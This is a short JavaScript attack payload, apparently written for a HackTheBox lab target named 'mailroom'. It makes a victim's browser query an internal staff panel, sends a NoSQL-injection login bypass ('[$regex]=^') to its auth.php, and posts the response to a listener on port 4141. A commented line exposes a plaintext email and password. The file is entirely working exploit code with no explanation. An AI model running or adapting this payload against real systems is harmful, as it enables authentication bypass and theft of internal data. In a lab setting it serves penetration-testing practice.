var staffReviewPanelUrl = "http://staff-review-panel.mailroom.htb";

function getmailroom(url) {
    var req1 = new XMLHttpRequest();
    req1.open("GET", url + "/register.html", false);
    req1.send();
    var resp = req1.response;
    return resp;
}

function authmailroom(url) {
    var req1 = new XMLHttpRequest();
    req1.open("POST", url + "/auth.php", false);
    req1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    // const data = "email=tristan@mailroom.htb&password=69trisRulez!";
    const data = "email[$regex]=^&password[$regex]=^";
    req1.send(data);
    var resp = req1.response;
    return resp;
}


function main() {
    // var resp = getmailroom(staffReviewPanelUrl);
    var resp = authmailroom(staffReviewPanelUrl);

    var req2 = new XMLHttpRequest();
    req2.open("POST", "http://127.0.0.1:4141/", false);
    req2.setRequestHeader("Content-Type", "text/plain");
    req2.send(resp);
}

main();
